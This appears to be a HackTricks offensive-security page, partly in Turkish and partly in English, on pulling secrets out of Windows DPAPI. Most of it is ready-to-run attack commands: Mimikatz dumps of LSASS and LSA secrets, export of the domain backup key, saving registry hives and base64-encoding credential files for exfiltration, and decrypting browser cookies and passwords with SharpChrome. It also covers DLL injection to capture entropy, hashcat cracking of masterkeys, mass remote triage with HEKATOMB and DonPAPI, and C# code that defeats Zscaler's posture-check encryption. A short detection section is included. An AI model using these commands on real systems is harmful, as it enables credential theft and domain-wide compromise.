# DPAPI - Parolaları Çıkarma

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

The Data Protection API (DPAPI) esas olarak Windows işletim sistemi içinde **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır; burada kullanıcı veya sistem sırları önemli bir entropi kaynağı olarak kullanılır. Bu yaklaşım geliştiriciler için şifrelemeyi basitleştirir: veriyi, kullanıcının oturum açma sırlarından türetilen bir anahtarla veya sistem şifrelemesi için sistemin domain kimlik doğrulama sırlarıyla şifreleyerek geliştiricinin şifreleme anahtarının korunmasını kendisinin yönetmesine gerek kalmaz.

DPAPI'yi kullanmanın en yaygın yolu **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır; bu fonksiyonlar uygulamaların veriyi, o anda oturum açmış olan işlemin oturumuyla güvenli şekilde şifreleyip çözmesine olanak tanır. Bu, şifrelenmiş verinin yalnızca aynı kullanıcı veya sistem tarafından çözülebileceği anlamına gelir.

Ayrıca, bu fonksiyonlar şifreleme ve şifre çözme sırasında kullanılacak bir **`entropy` parameter** alır; bu nedenle, bu parametre kullanılarak şifrelenmiş bir şeyi çözmek istiyorsanız, şifreleme sırasında kullanılan aynı entropy değerini vermeniz gerekir.

### Kullanıcı anahtarının oluşturulması

DPAPI, her kullanıcı için kimlik bilgilerine dayalı benzersiz bir anahtar (buna **`pre-key`** denir) oluşturur. Bu anahtar kullanıcının parolasından ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır, ancak sonuçta bir SHA1 olur. Örneğin, domain kullanıcıları için **kullanıcının NTLM hash'ine bağlıdır**.

Bu özellikle ilginçtir çünkü bir saldırgan kullanıcının parola hash'ini ele geçirebilirse:

- Kullanıcının anahtarıyla DPAPI kullanılarak şifrelenmiş herhangi bir veriyi **API ile iletişime geçmeye gerek kalmadan çözebilir**
- Geçerli DPAPI anahtarını üretmeye çalışarak parolayı **çevrimdışı kırmayı** deneyebilir

Ayrıca, bir kullanıcı DPAPI kullanarak her veri şifrelediğinde yeni bir **master key** oluşturulur. Bu master key aslında veriyi şifrelemek için kullanılır. Her master key bir **GUID** (Globally Unique Identifier) ile tanımlanır.

Master key'ler **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}` o kullanıcının Security Identifier'ıdır. Master key, kullanıcının **`pre-key`**'iyle ve kurtarma için bir **domain backup key** ile şifrelenmiş olarak saklanır (yani aynı anahtar iki farklı yol ile şifrelenmiş şekilde saklanır).

Dikkat edin ki master key'i şifrelemek için kullanılan **domain key domain controller'larda bulunur ve asla değişmez**, bu yüzden bir saldırgan domain controller'a erişebilirse domain backup key'i alıp domain içindeki tüm kullanıcıların master key'lerini çözebilir.

Şifrelenmiş blob'lar, içlerindeki veriyi şifrelemek için kullanılan master key'in **GUID**'ini başlıklarında içerir.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bir kullanıcının birkaç Master Key'inin nasıl göründüğüne örnek:

![](<../../images/image (1121).png>)

### Makine/Sistem anahtar oluşturma

Bu, makinenin verileri şifrelemesi için kullanılan anahtardır. **DPAPI_SYSTEM LSA secret**'a dayanır; yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki sırlar gibi sistem tarafından erişilmesi gereken verileri şifrelemek için kullanılır.

Not: bu anahtarların **etki alanı yedeği yoktur**, bu yüzden yalnızca yerel olarak erişilebilir:

- **Mimikatz**, `mimikatz lsadump::secrets` komutuyla LSA secrets'ları dump ederek buna erişebilir.
- Gizli bilgi kayıt defterinde saklanır; bu yüzden bir yönetici **DACL izinlerini değiştirerek buna erişebilir**. Kayıt defteri yolu: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hive'lerinden çevrimdışı çıkarım da mümkündür. Örneğin, hedefte yönetici olarak hive'leri kaydedip exfiltrate edebilirsiniz:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Daha sonra analysis box'unuzda hivelardan DPAPI_SYSTEM LSA secret'ini kurtarın ve bunu machine-scope blobs'ların (scheduled task passwords, service credentials, Wi‑Fi profiles vb.) şifrelerini çözmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer ve Google Chrome parolaları ile otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar (şifreleme anahtarları dahil)
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme/kimlik doğrulama amaçları için özel anahtarlar ve parolalar
- Credential Manager tarafından yönetilen ağ parolaları ve CryptProtectData kullanan uygulamalardaki kişisel veriler (ör. Skype, MSN messenger vb.)
- Register içindeki şifrelenmiş blob'lar
- ...

System protected data includes:
- Wifi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel admin ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Kullanıcının local admin privileges varsa, **DPAPI_SYSTEM LSA secret**'e erişip machine master keys'in şifrelerini çözebilirler:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcıya ait master anahtarlarını doğrudan şifre çözebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Eğer kullanıcı olarak bir oturum içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** isteyebilirsiniz. Eğer local admin iseniz ve kullanıcı oturum açmışsa, bunun için **steal his session token** yapabilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ı Listele
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilere Erişim

### DPAPI Şifrelenmiş verileri bul

Kullanıcıların yaygın **korunan dosyaları** şunlardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ayrıca yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanmayı da kontrol edin.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) dosya sisteminde, registry'de ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repo'dan) DPAPI kullanarak cookies gibi hassas verileri şifre çözmek için kullanılabilir.

#### Chromium/Edge/Electron hızlı yöntemler (SharpChrome)

- Mevcut kullanıcı, kaydedilmiş logins/cookies'ın etkileşimli şifre çözümü (Chrome 127+ app-bound cookies ile bile çalışır çünkü ekstra anahtar kullanıcı bağlamında çalıştırıldığında kullanıcının Credential Manager'ından çözülür):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Sadece dosyalarınız olduğunda yapılan Offline analysis. İlk olarak profilin "Local State" dosyasından AES state key'i çıkarın ve ardından cookie DB'yi decrypt etmek için kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-genelinde/uzaktan triage, DPAPI domain backup key (PVK) ve target host üzerinde admin olduğunuzda:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Eğer bir kullanıcının DPAPI prekey/credkey (LSASS'den) elinizdeyse, password cracking'i atlayıp profile data'yı doğrudan decrypt edebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Yeni Chrome/Edge sürümleri bazı çerezleri "App-Bound" şifreleme kullanarak saklayabilir. Bu belirli çerezlerin çevrimdışı olarak çözümlenmesi ek app-bound key olmadan mümkün değildir; SharpChrome'u hedef kullanıcı bağlamında çalıştırın; böylece anahtar otomatik olarak alınır. Aşağıda referans verilen Chrome güvenlik blog gönderisine bakın.

### Erişim anahtarları ve veriler

- **SharpDPAPI'yi kullanın** mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials bilgilerini edinin** (encrypted data ve guidMasterKey gibi).
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC kullanarak **domain backup key** talep eden bir kullanıcının masterkey'ini decrypt edin:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı ayrıca masterkey şifre çözümü için bu argümanları destekler (örneğin `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak veya `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek mümkündür...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Masterkey kullanarak veriyi şifre çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için şu argümanları destekler (örneğin `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak, `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek, `/unprotect` ile mevcut kullanıcının oturumunu kullanmak mümkün...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey'i doğrudan kullanmak (no password needed)

Eğer LSASS'i dump edebiliyorsanız, Mimikatz genellikle kullanıcı için per-logon DPAPI key'i açığa çıkarır; bu key, plaintext password'u bilmeden kullanıcının masterkeys'lerini decrypt etmek için kullanılabilir. Bu değeri doğrudan tooling'e verin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Bazı verileri **geçerli kullanıcı oturumu** kullanarak Decrypt et:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile çevrimdışı şifre çözme

Eğer hedef kullanıcının SID'ine ve parolasına (veya NT hash'ine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey'lerini ve Credential Manager blob'larını tamamen çevrimdışı olarak çözebilirsiniz.

- Diskteki artefaktları belirleyin:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Dosya transfer araçları güvenilmezse, dosyaları hedef makinede base64 ile kodlayıp çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Kullanıcının SID'i ve parola/hash'i ile masterkey'i deşifre et:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Çözülen masterkey'i kullanarak credential blob'u dekripte edin:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu çalışma akışı genellikle Windows Credential Manager kullanan uygulamalar tarafından kaydedilen etki alanı kimlik bilgilerini geri getirir; bunlar arasında yönetici hesapları da bulunur (örn. `*_adm`).

---

### Opsiyonel Entropy'nin İşlenmesi ("Third-party entropy")

Bazı uygulamalar `CryptProtectData`'ya ek bir **entropy** değeri iletir. Doğru masterkey bilinse bile, bu değer olmadan blob şifre çözülemez. Bu nedenle, Microsoft Outlook veya bazı VPN istemcileri gibi bu şekilde korunan kimlik bilgileri hedeflendiğinde entropy'nin elde edilmesi zorunludur.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI fonksiyonlarını hook'layan bir user-mode DLL'dir ve sağlanan herhangi bir opsiyonel entropy'yi şeffaf şekilde kaydeder. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran süreç ve blob ile eşleyen bir dosya oluşturur. Yakalanan entropy daha sonra veriyi şifre çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) ile sağlanabilir.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile başlayarak **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (December 2023) hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) ekleyerek kullanıcı parolalarının masterkey dosyasından doğrudan GPU hızlandırmalı kırılmasına izin verdi. Bu sayede saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.

`DPAPISnoop` (2024) süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential and Vault blobs öğelerini ayrıştırıp kırılmış anahtarlarla şifrelerini çözüp düz metin parolaları dışa aktarabilir.

### Diğer makine verilerine erişim

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Elbette o makineye erişim sağlayabilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key is known** varsayılmaktadır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC üzerinden domain controller yedek anahtarını (backup key) çıkarmayı otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm bilgisayarlarda smbclient çalıştırarak tüm kullanıcıların DPAPI blob'larını alır ve her şeyi domain backup key ile deşifre eder.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılan bilgisayar listesi ile, daha önce bilmediğiniz alt ağların her birini bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI ile korunan sırları otomatik olarak dökebilir. 2.x sürümü şunları getirdi:

* Yüzlerce host'tan blob'ların paralel toplanması
* **context 3** masterkey'lerinin parse edilmesi ve otomatik Hashcat kırma entegrasyonu
* Chrome "App-Bound" şifreli çerezler için destek (bir sonraki bölüme bakın)
* Uç noktaları tekrar tekrar sorgulayan ve yeni oluşturulan blob'ları diffleyen yeni **`--snapshot`** modu

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyalarını parse eden bir C# aracıdır; Hashcat/JtR formatları çıktılayabilir ve isteğe bağlı olarak kırmayı otomatik olarak başlatabilir. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tam olarak destekler.

## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilgili dizinlere erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından erişimler.
- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanımı.
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** nesnesine erişim ile korelasyon kurulabilir.
- Bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde Event **4673/4674**

---
### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü amaçlı bir DPAPI backup key almaya kandırarak kullanıcı masterkey'lerini deşifre etmesine olanak sağlayabiliyordu. Kasım 2023 toplu güncellemesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tamamen yamalı olduğundan emin olmalıdır.
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eski DPAPI-yalnız korumayı, kullanıcının **Credential Manager** altında saklanan ek bir anahtar ile değiştirdi. Çerezlerin çevrimdışı deşifresi artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektirmektedir. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldığında ekstra anahtarı kurtarabilir.

### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Özel Entropi

Zscaler Client Connector birkaç konfigürasyon dosyasını `C:\ProgramData\Zscaler` altında saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenmiştir ancak satıcı diske kaydedilmek yerine *runtime* sırasında hesaplanan **custom entropy** sağlar.

Entropi iki elemandan yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içinde gömülü hard-code edilmiş bir gizli değer.
2. Konfigürasyonun ait olduğu Windows hesabının **SID**'i.

DLL tarafından uygulanan algoritma eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Çünkü gizli, disketen okunabilen bir DLL içinde gömülü olduğu için, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden oluşturabilir** ve blob'ların şifresini çevrimdışı çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren tam JSON yapılandırmasını verir — istemci tarafı bypass denemelerinde çok değerli olan bilgiler.

> İPUCU: Diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropi olmadan** (`16` sıfır bayt) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan çözülebilirler.

## Referanslar

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
